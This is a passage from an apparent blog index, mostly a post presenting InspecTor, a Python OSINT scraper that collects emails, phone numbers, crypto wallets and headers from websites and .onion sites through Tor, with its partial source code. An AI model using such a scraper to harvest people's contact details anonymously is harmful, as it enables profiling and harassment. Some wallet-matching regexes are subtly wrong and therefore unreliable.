said.\u003c/p\u003e\n\u003cp\u003eToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\u003c/p\u003e","title":"MITM Attacks"},{"content":"InspecTor: Metadata Extraction from Websites InspecTor is a command-line tool designed for extracting metadata from websites, including .onion domains, while maintaining anonymity through the Tor network. This tool provides a straightforward way to gather information such as emails, phone numbers, links, images, and more, making it useful for cybersecurity researchers, investigators, and analysts. Its ability to handle dynamic content with Selenium and process multiple URLs concurrently adds flexibility and efficiency to metadata collection.\nPurpose and Use Cases InspecTor is built for scenarios where metadata from websites needs to be extracted efficiently and anonymously. By routing requests through Tor, it supports investigations into .onion sites without revealing the user\u0026rsquo;s identity. The tool is particularly suited for:\nCybersecurity Research: Extracting emails, crypto wallet addresses, and server technologies for threat analysis. OSINT Investigations: Gathering links, contact details, and other metadata from publicly accessible websites. Website Audits: Identifying exposed information such as headers, social media links, or CSP policies. Key Features Extraction of metadata fields such as emails, phone numbers, images, links, and more. Support for .onion websites via the Tor network. Handling of dynamic content using Selenium (optional). Concurrent processing of multiple URLs with configurable threading. Output to JSON, SQLite database, or human-readable format. Flexible metadata field selection for targeted extractions. Installation To set up InspecTor:\nClone the repository:\ngit clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor Install Python dependencies:\npip install -r requirements.txt Install Tor and ensure it is running:\nsudo apt update sudo apt install tor sudo systemctl start tor Set up Chrome and ChromeDriver (if using Selenium):\nInstall Chrome from the official website. Download the matching ChromeDriver version based on your Chrome browser version. Usage InspecTor accepts URLs directly or through input files. Below are common usage scenarios:\nExtract Metadata from Specific URLs To extract metadata from one or more URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Extract Metadata from a File of URLs Provide a text file with one URL per line:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests, including those to non-.onion domains, through the Tor network:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Specify an output file or SQLite database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Metadata Fields Select fields like emails, links, or phone_numbers for targeted extractions:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle Dynamic Content with Selenium Enable Selenium for JavaScript-heavy pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Examples Extract all metadata:\npython3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Extract emails and phone numbers:\npython3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Disable SSL verification and output results in a human-readable format:\npython3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON File: Save metadata to a file using the -o option. Use \u0026quot;-\u0026quot; to output directly to stdout. SQLite Database: Store metadata in a database with the --database option. Human-Readable: Print results in a user-friendly format using --human-readable. Notes and Considerations Tor Requirements: Ensure the Tor service is running on 127.0.0.1:9050 to access .onion domains or force Tor routing. Selenium Setup: If dynamic content extraction is required, make sure Chrome and ChromeDriver are installed and configured. SSL Verification: SSL certificate verification is enabled by default. Use --no-verify-ssl for sites with invalid certificates. Concurrency: Adjust the number of threads using --max-workers for faster processing. Dependencies: Install all Python dependencies from requirements.txt. Why Use InspecTor? InspecTor simplifies metadata collection from websites, particularly .onion domains, by integrating essential features into a single, configurable tool. Its focus on anonymity, flexibility, and targeted extraction makes it valuable for cybersecurity research and OSINT investigations. Whether you are analyzing a website’s metadata, auditing exposed information, or conducting investigations, InspecTor is a practical tool designed to save time and effort.\nScript #!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; InspecTor.py A script to extract metadata from websites using optional Tor anonymity. Author: Noobosaurus R3x Date: December 2024 Note: I am not a professional developer, and this tool could be improved with your help. Feel free to fork the repository and enhance it by adding features, fixing bugs, or optimizing the code. \u0026#34;\u0026#34;\u0026#34; import argparse import json import logging import os import re import socket import sys import time import html from concurrent.futures import ThreadPoolExecutor, as_completed from urllib.parse import urljoin, urlparse import requests from bs4 import BeautifulSoup from requests.adapters import HTTPAdapter from urllib import robotparser import sqlite3 from urllib3.util.retry import Retry from fake_useragent import UserAgent from datetime import datetime import phonenumbers from phonenumbers import NumberParseException from urllib3.exceptions import InsecureRequestWarning import urllib3 # Disable insecure request warnings if SSL verification is off. urllib3.disable_warnings(category=InsecureRequestWarning) try: from colorama import Fore, Style, init init(autoreset=True) except ImportError: print(\u0026#34;The \u0026#39;colorama\u0026#39; library is required for colored output. Please install it using \u0026#39;pip install colorama\u0026#39;.\u0026#34;) sys.exit(1) try: from selenium import webdriver from selenium.webdriver.chrome.options import Options SELENIUM_AVAILABLE = True except ImportError: SELENIUM_AVAILABLE = False def setup_logging(): \u0026#34;\u0026#34;\u0026#34; Set up the logging configuration. Logs are displayed both on stdout and in \u0026#39;InspecTor.log\u0026#39;. \u0026#34;\u0026#34;\u0026#34; logging.basicConfig( level=logging.INFO, format=\u0026#39;%(asctime)s - %(levelname)s - %(message)s\u0026#39;, handlers=[ logging.StreamHandler(sys.stdout), logging.FileHandler(\u0026#39;InspecTor.log\u0026#39;) ] ) def setup_argparser(): \u0026#34;\u0026#34;\u0026#34; Set up command-line argument parsing with options for URLs, files, output, SSL verification, Selenium usage, concurrency, database, and fields. \u0026#34;\u0026#34;\u0026#34; parser = argparse.ArgumentParser( description=\u0026#39;Extract metadata from websites using optional Tor anonymity.\u0026#39; ) # One of these two arguments is required group = parser.add_mutually_exclusive_group(required=True) group.add_argument( \u0026#39;-u\u0026#39;, \u0026#39;--urls\u0026#39;, nargs=\u0026#39;+\u0026#39;, help=\u0026#39;List of URLs to scrape.\u0026#39; ) group.add_argument( \u0026#39;-f\u0026#39;, \u0026#39;--file\u0026#39;, type=str, help=\u0026#39;Path to a file containing URLs, one per line.\u0026#39; ) parser.add_argument( \u0026#39;-o\u0026#39;, \u0026#39;--output\u0026#39;, type=str, default=\u0026#39;site_metadata.json\u0026#39;, help=\u0026#39;Output JSON file to save metadata (use \u0026#34;-\u0026#34; for stdout).\u0026#39; ) parser.add_argument( \u0026#39;--verify-ssl\u0026#39;, dest=\u0026#39;verify_ssl\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#39;Enable SSL certificate verification (default: True).\u0026#39; ) parser.add_argument( \u0026#39;--no-verify-ssl\u0026#39;, dest=\u0026#39;verify_ssl\u0026#39;, action=\u0026#39;store_false\u0026#39;, help=\u0026#39;Disable SSL certificate verification.\u0026#39; ) parser.set_defaults(verify_ssl=True) parser.add_argument( \u0026#39;--use-selenium\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#39;Use Selenium for handling dynamic content (requires ChromeDriver).\u0026#39; ) parser.add_argument( \u0026#39;--max-workers\u0026#39;, type=int, default=5, help=\u0026#39;Maximum number of concurrent threads (default: 5).\u0026#39; ) parser.add_argument( \u0026#39;--database\u0026#39;, type=str, default=\u0026#39;metadata.db\u0026#39;, help=\u0026#39;SQLite database file to store metadata (default: metadata.db).\u0026#39; ) # Field extraction options extraction_group = parser.add_mutually_exclusive_group() extraction_group.add_argument( \u0026#39;--fields\u0026#39;, nargs=\u0026#39;+\u0026#39;, help=\u0026#39;Specify which metadata fields to extract. \u0026#39; \u0026#39;Available fields: url, title, description, keywords, og_title, og_description, \u0026#39; \u0026#39;timestamp, headers, images, scripts, css_files, social_links, \u0026#39; \u0026#39;csp, server_technologies, crypto_wallets, links, emails, external_links, \u0026#39; \u0026#39;http_headers, phone_numbers.\u0026#39; ) extraction_group.add_argument( \u0026#39;--extract-all\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#39;Extract all available metadata fields.\u0026#39; ) parser.add_argument( \u0026#39;--human-readable\u0026#39;, \u0026#39;-hr\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#39;Output the results in a human-readable format.\u0026#39; ) parser.add_argument( \u0026#39;--force-tor\u0026#39;, action=\u0026#39;store_true\u0026#39;, help=\u0026#39;Route all traffic through Tor, even for regular URLs.\u0026#39; ) parser.add_argument( \u0026#39;--default-region\u0026#39;, type=str, default=None, help=\u0026#39;Default region code for parsing phone numbers (e.g., \u0026#34;FR\u0026#34; for France).\u0026#39; ) return parser def load_urls_from_file(file_path): \u0026#34;\u0026#34;\u0026#34; Load URLs from a text file, one per line. If the file is not found, the script exits. \u0026#34;\u0026#34;\u0026#34; if not os.path.isfile(file_path): logging.error(f\u0026#34;The file \u0026#39;{file_path}\u0026#39; does not exist.\u0026#34;) sys.exit(1) with open(file_path, \u0026#39;r\u0026#39;) as f: urls = [line.strip() for line in f if line.strip()] return urls def setup_session(verify_ssl=True, use_tor=False): \u0026#34;\u0026#34;\u0026#34; Set up a requests session with optional Tor proxy and a retry strategy. Also sets a random or fallback User-Agent header. \u0026#34;\u0026#34;\u0026#34; session = requests.Session() if use_tor: session.proxies = { \u0026#39;http\u0026#39;: \u0026#39;socks5h://127.0.0.1:9050\u0026#39;, \u0026#39;https\u0026#39;: \u0026#39;socks5h://127.0.0.1:9050\u0026#39; } # Configure retries for robustness retries = HTTPAdapter(max_retries=Retry( total=3, backoff_factor=2, status_forcelist=[500, 502, 503, 504], allowed_methods=[\u0026#34;HEAD\u0026#34;, \u0026#34;GET\u0026#34;, \u0026#34;OPTIONS\u0026#34;] )) session.mount(\u0026#39;http://\u0026#39;, retries) session.mount(\u0026#39;https://\u0026#39;, retries) # Handle SSL verification if disabled session.verify = verify_ssl # Try to use a randomized User-Agent to avoid easy fingerprinting ua = UserAgent() try: session.headers.update({\u0026#39;User-Agent\u0026#39;: ua.random}) except Exception as e: logging.warning(f\u0026#34;Failed to retrieve a random User-Agent. Falling back to default. Error: {e}\u0026#34;) session.headers.update({\u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) \u0026#39; \u0026#39;AppleWebKit/537.36 (KHTML, like Gecko) \u0026#39; \u0026#39;Chrome/91.0.4472.124 Safari/537.36\u0026#39;}) return session def is_tor_port_open(host=\u0026#39;127.0.0.1\u0026#39;, port=9050): \u0026#34;\u0026#34;\u0026#34; Check if the Tor SOCKS5 proxy port is open. This ensures Tor is running and accessible. \u0026#34;\u0026#34;\u0026#34; with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.settimeout(5) try: s.connect((host, port)) logging.info(f\u0026#34;Tor SOCKS5 proxy is listening on {host}:{port}.\u0026#34;) return True except socket.error: logging.error(f\u0026#34;Cannot connect to Tor SOCKS5 proxy on {host}:{port}.\u0026#34;) return False def is_valid_url(url): \u0026#34;\u0026#34;\u0026#34; Validate the URL\u0026#39;s scheme and netloc to ensure it\u0026#39;s well-formed. \u0026#34;\u0026#34;\u0026#34; try: parsed = urlparse(url) if parsed.scheme not in (\u0026#39;http\u0026#39;, \u0026#39;https\u0026#39;): return False if not parsed.netloc: return False return True except Exception: return False def extract_phone_numbers(page_text, default_region=None): \u0026#34;\u0026#34;\u0026#34; Extract phone numbers from page text using the phonenumbers library. This tries to parse and format phone numbers found in the text. \u0026#34;\u0026#34;\u0026#34; potential_numbers = re.findall(r\u0026#39;\\+?\\d[\\d\\s().-]{7,}\\d\u0026#39;, page_text) phone_numbers_list = [] for number in potential_numbers: try: parsed_number = phonenumbers.parse(number, default_region) if phonenumbers.is_valid_number(parsed_number): formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.E164) phone_numbers_list.append(formatted_number) except NumberParseException: continue return list(set(phone_numbers_list)) if phone_numbers_list else None def decode_email(encoded_str): \u0026#34;\u0026#34;\u0026#34; Decode HTML-escaped strings. This is useful if email addresses are obfuscated. \u0026#34;\u0026#34;\u0026#34; decoded_str = html.unescape(encoded_str) return decoded_str def try_selenium(url, use_tor): \u0026#34;\u0026#34;\u0026#34; Attempt to use Selenium with a headless Chrome browser to render dynamic content. If Selenium or ChromeDriver is not available, or if any error occurs, this returns (None, None), indicating that the code should fall back to the requests library. \u0026#34;\u0026#34;\u0026#34; if not SELENIUM_AVAILABLE: logging.warning(\u0026#34;Selenium is not available. Falling back to requests only.\u0026#34;) return None, None options = Options() # Use the recommended \u0026#39;--headless\u0026#39; flag for newer Chrome versions options.add_argument(\u0026#39;--headless\u0026#39;) options.add_argument(\u0026#39;--disable-gpu\u0026#39;) options.add_argument(\u0026#39;--no-sandbox\u0026#39;) options.add_argument(\u0026#39;--disable-dev-shm-usage\u0026#39;) if use_tor: options.add_argument(\u0026#39;--proxy-server=socks5://127.0.0.1:9050\u0026#39;) try: driver = webdriver.Chrome(options=options) except Exception as e: logging.warning(f\u0026#34;Unable to start Selenium Chrome WebDriver: {e}. Falling back to requests only.\u0026#34;) return None, None try: driver.set_page_load_timeout(30) driver.get(url) # Wait for JS to load some content time.sleep(5) page_source = driver.page_source driver.quit() soup = BeautifulSoup(page_source, \u0026#39;html.parser\u0026#39;) # Selenium doesn\u0026#39;t provide direct access to response headers # so we return empty for headers response_headers = {} return soup, response_headers except Exception as e: logging.error(f\u0026#34;Selenium failed to retrieve {url}: {e}\u0026#34;) driver.quit() return None, None def extract_metadata(url, args, fields=None, default_region=None): \u0026#34;\u0026#34;\u0026#34; Extract metadata from a given URL. Uses requests or Selenium based on args. Fields to extract can be specified, or \u0026#39;--extract-all\u0026#39; can be used for everything. If the URL is an onion domain or Tor is forced, requests go through Tor. \u0026#34;\u0026#34;\u0026#34; is_onion = urlparse(url).netloc.endswith(\u0026#39;.onion\u0026#39;) use_tor = is_onion or args.force_tor session = setup_session(verify_ssl=args.verify_ssl, use_tor=use_tor) # Define all possible fields for future reference all_possible_fields = { \u0026#39;url\u0026#39;, \u0026#39;title\u0026#39;, \u0026#39;description\u0026#39;, \u0026#39;keywords\u0026#39;, \u0026#39;og_title\u0026#39;, \u0026#39;og_description\u0026#39;, \u0026#39;timestamp\u0026#39;, \u0026#39;headers\u0026#39;, \u0026#39;images\u0026#39;, \u0026#39;scripts\u0026#39;, \u0026#39;css_files\u0026#39;, \u0026#39;social_links\u0026#39;, \u0026#39;csp\u0026#39;, \u0026#39;server_technologies\u0026#39;, \u0026#39;crypto_wallets\u0026#39;, \u0026#39;links\u0026#39;, \u0026#39;emails\u0026#39;, \u0026#39;external_links\u0026#39;, \u0026#39;http_headers\u0026#39;, \u0026#39;phone_numbers\u0026#39; } # Determine which fields we want to extract if args.extract_all: fields_to_extract = all_possible_fields else: if fields is None: # Default fields if none provided fields_to_extract = { \u0026#39;url\u0026#39;, \u0026#39;title\u0026#39;, \u0026#39;description\u0026#39;, \u0026#39;keywords\u0026#39;, \u0026#39;og_title\u0026#39;, \u0026#39;og_description\u0026#39;, \u0026#39;timestamp\u0026#39;, \u0026#39;http_headers\u0026#39; } else: invalid_fields = set(fields) - all_possible_fields if invalid_fields: logging.warning(f\u0026#34;Invalid fields specified for extraction: {\u0026#39;, \u0026#39;.join(invalid_fields)}\u0026#34;) fields_to_extract = set(fields) - invalid_fields else: fields_to_extract = set(fields) # Attempt Selenium if requested if args.use_selenium: soup, response_headers = try_selenium(url, use_tor) if soup is None: # If Selenium failed, fallback to requests try: response = session.get(url, timeout=15) response.raise_for_status() soup = BeautifulSoup(response.text, \u0026#39;html.parser\u0026#39;) response_headers = dict(response.headers) except requests.exceptions.RequestException as e: logging.error(f\u0026#34;Connection error accessing {url}: {e}\u0026#34;) return None else: # If Selenium not requested, use requests directly try: response = session.get(url, timeout=15) response.raise_for_status() soup = BeautifulSoup(response.text, \u0026#39;html.parser\u0026#39;) response_headers = dict(response.headers) except requests.exceptions.RequestException as e: logging.error(f\u0026#34;Connection error accessing {url}: {e}\u0026#34;) return None metadata = {} page_text = soup.get_text() # Extracting fields one by one, checking if they are requested if \u0026#39;url\u0026#39; in fields_to_extract: metadata[\u0026#39;url\u0026#39;] = url if \u0026#39;title\u0026#39; in fields_to_extract: metadata[\u0026#39;title\u0026#39;] = soup.title.string.strip() if soup.title and soup.title.string else None if \u0026#39;description\u0026#39; in fields_to_extract: meta_desc = soup.find(\u0026#39;meta\u0026#39;, attrs={\u0026#39;name\u0026#39;: \u0026#39;description\u0026#39;}) metadata[\u0026#39;description\u0026#39;] = meta_desc.get(\u0026#39;content\u0026#39;, \u0026#39;\u0026#39;).strip() if meta_desc else None if \u0026#39;keywords\u0026#39; in fields_to_extract: meta_keywords = soup.find(\u0026#39;meta\u0026#39;, attrs={\u0026#39;name\u0026#39;: \u0026#39;keywords\u0026#39;}) metadata[\u0026#39;keywords\u0026#39;] = meta_keywords.get(\u0026#39;content\u0026#39;, \u0026#39;\u0026#39;).strip() if meta_keywords else None if \u0026#39;og_title\u0026#39; in fields_to_extract: og_title = soup.find(\u0026#39;meta\u0026#39;, property=\u0026#39;og:title\u0026#39;) metadata[\u0026#39;og_title\u0026#39;] = og_title.get(\u0026#39;content\u0026#39;, \u0026#39;\u0026#39;).strip() if og_title else None if \u0026#39;og_description\u0026#39; in fields_to_extract: og_description = soup.find(\u0026#39;meta\u0026#39;, property=\u0026#39;og:description\u0026#39;) metadata[\u0026#39;og_description\u0026#39;] = og_description.get(\u0026#39;content\u0026#39;, \u0026#39;\u0026#39;).strip() if og_description else None if \u0026#39;timestamp\u0026#39; in fields_to_extract: metadata[\u0026#39;timestamp\u0026#39;] = datetime.utcnow().replace(microsecond=0).isoformat() + \u0026#34;Z\u0026#34; if \u0026#39;http_headers\u0026#39; in fields_to_extract: metadata[\u0026#39;http_headers\u0026#39;] = response_headers if response_headers else None # Additional fields that require more complex extraction logic if fields_to_extract.intersection({ \u0026#39;headers\u0026#39;, \u0026#39;images\u0026#39;, \u0026#39;scripts\u0026#39;, \u0026#39;css_files\u0026#39;, \u0026#39;social_links\u0026#39;, \u0026#39;csp\u0026#39;, \u0026#39;server_technologies\u0026#39;, \u0026#39;crypto_wallets\u0026#39;, \u0026#39;links\u0026#39;, \u0026#39;emails\u0026#39;, \u0026#39;external_links\u0026#39;, \u0026#39;phone_numbers\u0026#39; }): if \u0026#39;headers\u0026#39; in fields_to_extract: # Extract h1, h2, h3 headers headers_list = [header.get_text(strip=True) for header in soup.find_all([\u0026#39;h1\u0026#39;, \u0026#39;h2\u0026#39;, \u0026#39;h3\u0026#39;])] metadata[\u0026#39;headers\u0026#39;] = headers_list if headers_list else None if \u0026#39;images\u0026#39; in fields_to_extract: # Extract images and their alt attributes images_list = [{\u0026#39;src\u0026#39;: img.get(\u0026#39;src\u0026#39;), \u0026#39;alt\u0026#39;: (img.get(\u0026#39;alt\u0026#39;, \u0026#39;\u0026#39;) or \u0026#39;\u0026#39;).strip()} for img in soup.find_all(\u0026#39;img\u0026#39;, src=True)] metadata[\u0026#39;images\u0026#39;] = images_list if images_list else None if \u0026#39;scripts\u0026#39; in fields_to_extract: # Extract external scripts scripts_list = [script[\u0026#39;src\u0026#39;] for script in soup.find_all(\u0026#39;script\u0026#39;, src=True)] metadata[\u0026#39;scripts\u0026#39;] = scripts_list if scripts_list else None if \u0026#39;css_files\u0026#39; in fields_to_extract: # Extract CSS files css_files_list = [link[\u0026#39;href\u0026#39;] for link in soup.find_all(\u0026#39;link\u0026#39;, rel=\u0026#39;stylesheet\u0026#39;)] metadata[\u0026#39;css_files\u0026#39;] = css_files_list if css_files_list else None if \u0026#39;social_links\u0026#39; in fields_to_extract: # Extract social media links by matching known platforms social_links_list = [a[\u0026#39;href\u0026#39;] for a in soup.find_all(\u0026#39;a\u0026#39;, href=True) if any(platform in a[\u0026#39;href\u0026#39;] for platform in [\u0026#39;twitter.com\u0026#39;, \u0026#39;facebook.com\u0026#39;, \u0026#39;linkedin.com\u0026#39;])] metadata[\u0026#39;social_links\u0026#39;] = social_links_list if social_links_list else None if \u0026#39;csp\u0026#39; in fields_to_extract: # Extract Content-Security-Policy meta tag if available csp = soup.find(\u0026#39;meta\u0026#39;, attrs={\u0026#39;http-equiv\u0026#39;: \u0026#39;Content-Security-Policy\u0026#39;}) metadata[\u0026#39;csp\u0026#39;] = csp[\u0026#39;content\u0026#39;] if csp else None if \u0026#39;server_technologies\u0026#39; in fields_to_extract: # Identify server technologies from headers server_technologies = {} if response_headers: if \u0026#39;Server\u0026#39; in response_headers: server_technologies[\u0026#39;server\u0026#39;] = response_headers.get(\u0026#39;Server\u0026#39;) if \u0026#39;X-Powered-By\u0026#39; in response_headers: server_technologies[\u0026#39;powered_by\u0026#39;] = response_headers.get(\u0026#39;X-Powered-By\u0026#39;) metadata[\u0026#39;server_technologies\u0026#39;] = server_technologies if server_technologies else None if \u0026#39;crypto_wallets\u0026#39; in fields_to_extract: # Extract various crypto wallet addresses from the page text crypto_wallets = {} # Bitcoin addresses bitcoin_addresses = re.findall(r\u0026#39;\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b\u0026#39;, page_text) if bitcoin_addresses: crypto_wallets[\u0026#39;bitcoin\u0026#39;] = list(set(bitcoin_addresses)) # Ethereum addresses ethereum_addresses = re.findall(r\u0026#39;\\b0x[a-fA-F0-9]{40}\\b\u0026#39;, page_text) if ethereum_addresses: crypto_wallets[\u0026#39;ethereum\u0026#39;] = list(set(ethereum_addresses)) # Litecoin addresses litecoin_legacy = re.findall(r\u0026#39;\\b[L,M][a-km-zA-HJ-NP-Z1-9]{26,33}\\b\u0026#39;, page_text) litecoin_bech32 = re.findall(r\u0026#39;\\bltc1[a-z0-9]{39}\\b\u0026#39;, page_text) if litecoin_legacy or litecoin_bech32: crypto_wallets[\u0026#39;litecoin\u0026#39;] = list(set(litecoin_legacy + litecoin_bech32)) # Dogecoin addresses dogecoin_addresses = re.findall(r\u0026#39;\\bD{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}\\b\u0026#39;, page_text) if dogecoin_addresses: crypto_wallets[\u0026#39;dogecoin\u0026#39;] = list(set(dogecoin_addresses)) # Bitcoin Cash bch_legacy = re.findall(r\u0026#39;\\b[L,M][a-km-zA-HJ-NP-Z1-9]{26,33}\\b\u0026#39;, page_text) bch_cashaddr = re.findall(r\u0026#39;\\b(q|p)[a-z0-9]{41}\\b\u0026#39;, page_text) if bch_legacy or bch_cashaddr: crypto_wallets[\u0026#39;bitcoin_cash\u0026#39;] = list(set(bch_legacy + bch_cashaddr)) # Dash dash_addresses = re.findall(r\u0026#39;\\b[X,7][a-km-zA-HJ-NP-Z1-9]{26,33}\\b\u0026#39;, page_text) if dash_addresses: crypto_wallets[\u0026#39;dash\u0026#39;] = list(set(dash_addresses)) # Monero monero_standard = re.findall(r\u0026#39;\\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\\b\u0026#39;, page_text) monero_integrated = re.findall(r\u0026#39;\\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{105}\\b\u0026#39;, page_text) if monero_standard or monero_integrated: crypto_wallets[\u0026#39;monero\u0026#39;] = list(set(monero_standard + monero_integrated)) # Ripple ripple_addresses = re.findall(r\u0026#39;\\br[0-9A-Za-z]{24,34}\\b\u0026#39;, page_text) if ripple_addresses: crypto_wallets[\u0026#39;ripple\u0026#39;] = list(set(ripple_addresses)) # Zcash zcash_transparent = re.findall(r\u0026#39;\\bt[1,3][a-km-zA-HJ-NP-Z1-9]{33}\\b\u0026#39;, page_text) zcash_shielded = re.findall(r\u0026#39;\\bzs[a-z0-9]{93}\\b\u0026#39;, page_text) if zcash_transparent or zcash_shielded: crypto_wallets[\u0026#39;zcash\u0026#39;] = list(set((zcash_transparent + zcash_shielded))) # Binance Coin binance_chain = re.findall(r\u0026#39;\\bbnb1[a-z0-9]{38}\\b\u0026#39;, page_text) binance_smart = ethereum_addresses if binance_chain or binance_smart: combined_binance = list(set(binance_chain + binance_smart)) if binance_smart else binance_chain crypto_wallets[\u0026#39;binance_coin\u0026#39;] = combined_binance # Cardano cardano_addresses = re.findall(r\u0026#39;\\baddr1[a-z0-9]{58}\\b\u0026#39;, page_text) if cardano_addresses: crypto_wallets[\u0026#39;cardano\u0026#39;] = list(set(cardano_addresses)) # Stellar stellar_addresses = re.findall(r\u0026#39;\\bG[A-Z2-7]{55}\\b\u0026#39;, page_text) if stellar_addresses: crypto_wallets[\u0026#39;stellar\u0026#39;] = list(set(stellar_addresses)) # Tether tether_omni = re.findall(r\u0026#39;\\b[13][a-km-zA-HJ-NP-Z1-9]{26,33}\\b\u0026#39;, page_text) tether_erc20 = ethereum_addresses tether_trc20 = re.findall(r\u0026#39;\\bT[a-z0-9]{33}\\b\u0026#39;, page_text) tether_combined = tether_omni + tether_erc20 + tether_trc20 if tether_erc20 else tether_omni + tether_trc20 if tether_combined: crypto_wallets[\u0026#39;tether\u0026#39;] = list(set(tether_combined)) # Solana solana_addresses = re.findall(r\u0026#39;\\b[A-HJ-NP-Za-km-z1-9]{43,44}\\b\u0026#39;, page_text) if solana_addresses: crypto_wallets[\u0026#39;solana\u0026#39;] = list(set(solana_addresses)) # Polkadot addresses (corrected pattern) polkadot_addresses = re.findall(r\u0026#39;\\b1[a-z0-9]{46}\\b\u0026#39;, page_text) if polkadot_addresses: crypto_wallets[\u0026#39;polkadot\u0026#39;] = list(set(polkadot_addresses)) # Chainlink chainlink_addresses = ethereum_addresses if chainlink_addresses: crypto_wallets[\u0026#39;chainlink\u0026#39;] = list(set(chainlink_addresses)) # Ethereum Classic etc_addresses = ethereum_addresses if etc_addresses: crypto_wallets[\u0026#39;ethereum_classic\u0026#39;] = list(set(etc_addresses)) metadata[\u0026#39;crypto_wallets\u0026#39;] = crypto_wallets if crypto_wallets else None if \u0026#39;links\u0026#39; in fields_to_extract or \u0026#39;external_links\u0026#39; in fields_to_extract: # Distinguish between internal and external links internal_links = [] external_links_list = [] base_netloc = urlparse(url).netloc for a in soup.find_all(\u0026#39;a\u0026#39;, href=True): href = a[\u0026#39;href\u0026#39;] parsed_href = urlparse(urljoin(url, href)) if base_netloc == parsed_href.netloc: internal_links.append(href) else: external_links_list.append(href) if \u0026#39;links\u0026#39; in fields_to_extract and internal_links: metadata[\u0026#39;links\u0026#39;] = internal_links if \u0026#39;external_links\u0026#39; in fields_to_extract and external_links_list: metadata[\u0026#39;external_links\u0026#39;] = external_links_list if \u0026#39;emails\u0026#39; in fields_to_extract: # Extract emails from text and mailto links emails = set() text_emails = re.findall(r\u0026#39;[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+\u0026#39;, page_text) emails.update(text_emails) # Extract emails from mailto links for a_tag in soup.find_all(\u0026#39;a\u0026#39;, href=True): href = a_tag[\u0026#39;href\u0026#39;] if \u0026#39;mailto:\u0026#39; in href: email = href.split(\u0026#39;mailto:\u0026#39;)[-1] email = decode_email(email) emails.add(email) # Extract reversed emails if present in custom tags for span in soup.find_all(\u0026#39;span\u0026#39;, {\u0026#39;class\u0026#39;: \u0026#39;odEmail\u0026#39;}): user = span.get(\u0026#39;data-user\u0026#39;, \u0026#39;\u0026#39;) website = span.get(\u0026#39;data-website\u0026#39;, \u0026#39;\u0026#39;) if user and website: user = user[::-1] website = website[::-1] email = f\u0026#34;{user}@{website}\u0026#34; emails.add(email) metadata[\u0026#39;emails\u0026#39;] = list(emails) if emails else None if \u0026#39;phone_numbers\u0026#39; in fields_to_extract: # Extract phone numbers phone_numbers_found = extract_phone_numbers(page_text, default_region=default_region) metadata[\u0026#39;phone_numbers\u0026#39;] = phone_numbers_found if phone_numbers_found else None if metadata: logging.info(f\u0026#34;Metadata extracted from {url}\u0026#34;) return metadata else: logging.error(f\u0026#34;No metadata extracted from {url}\u0026#34;) return None def setup_database(db_path=\u0026#39;metadata.db\u0026#39;): \u0026#34;\u0026#34;\u0026#34; Set up a SQLite database to store metadata. Create a table if it does not already exist. \u0026#34;\u0026#34;\u0026#34; conn = sqlite3.connect(db_path) cursor = conn.cursor() cursor.execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS metadata ( url TEXT PRIMARY KEY, title TEXT, description TEXT, keywords TEXT, og_title TEXT, og_description TEXT, timestamp TEXT, headers TEXT, images TEXT, scripts TEXT, css_files TEXT, social_links TEXT, csp TEXT, server_technologies TEXT, crypto_wallets TEXT, links TEXT, emails TEXT, external_links TEXT, http_headers TEXT, phone_numbers TEXT ) \u0026#39;\u0026#39;\u0026#39;) conn.commit() return conn def save_to_database(conn, metadata): \u0026#34;\u0026#34;\u0026#34; Save extracted metadata to the SQLite database. JSON fields are stored as JSON-encoded strings for complex fields. If a record with the same URL exists, it is replaced. \u0026#34;\u0026#34;\u0026#34; cursor = conn.cursor() cursor.execute(\u0026#39;\u0026#39;\u0026#39; INSERT OR REPLACE INTO metadata (url, title, description, keywords, og_title, og_description, timestamp, headers, images, scripts, css_files, social_links, csp, server_technologies, crypto_wallets, links, emails, external_links, http_headers, phone_numbers) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) \u0026#39;\u0026#39;\u0026#39;, ( metadata.get(\u0026#39;url\u0026#39;, \u0026#39;\u0026#39;), metadata.get(\u0026#39;title\u0026#39;, \u0026#39;\u0026#39;), metadata.get(\u0026#39;description\u0026#39;, \u0026#39;\u0026#39;), metadata.get(\u0026#39;keywords\u0026#39;, \u0026#39;\u0026#39;), metadata.get(\u0026#39;og_title\u0026#39;, \u0026#39;\u0026#39;), metadata.get(\u0026#39;og_description\u0026#39;, \u0026#39;\u0026#39;), metadata.get(\u0026#39;timestamp\u0026#39;, \u0026#39;\u0026#39;), json.dumps(metadata.get(\u0026#39;headers\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;images\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;scripts\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;css_files\u0026#39;, [])), json.dumps(metadata.get(\u0026#39;social_links\u0026#39;, [])), metadata.get(\u0026#39;csp\u0026#39;, 